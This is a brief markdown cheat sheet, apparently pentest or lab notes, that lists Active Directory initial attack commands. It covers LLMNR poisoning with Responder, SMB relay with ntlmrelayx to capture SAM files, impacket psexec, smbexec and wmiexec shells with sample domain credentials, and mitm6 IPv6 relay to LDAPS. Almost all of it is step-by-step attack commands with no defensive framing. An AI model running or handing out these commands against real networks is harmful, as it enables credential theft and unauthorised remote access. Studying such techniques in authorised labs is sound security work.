# Initial Attack Vectors

## LLMNR Poisoning
- `responder -I <INTERFACE_NAME> -dwv`


## SMB Relay

#### Prerequisite
- smb signing must be disabled on the target (by default is disable on client windows and enable on server windows)
- relayed user credentials must be admin on target machine

#### Check if smb signing is off on the targets:
- `nmap --script=smb2-security-mode.nse -p445 192.168.189.0/24`

#### Steps for this attack:
1. edit `responder.conf` and turn off smb and http services
2. run responder : `responder -I <INTERFACE_NAME> -dwv`
3. Put targets ip address in targets.txt file
4. run `ntlmrelayx.py -tf targets.txt -smb2support`
5. it will capture SAM file of the target machine

- Note : using `-i` with `ntlmrelayx.py` will give an interactive shell

#### Gaining shell access

```bash
impacket-psexec kernel.local/aliakbari:p@ssword1@192.168.127.242

impacket-smbexec kernel.local/aliakbari:p@ssword1@192.168.127.242

impacket-wmiexec kernel.local/aliakbari:p@ssword1@192.168.127.242
```

## IPv6 Attacks
1. `mitm6 -i eth1 -d kernel.local`
2. `impacket-ntlmrelayx -6 -t ldaps://192.168.127.248 -wh fakewpad.kernel.local -l lootme`
3. Wait for authentication or reboot a system
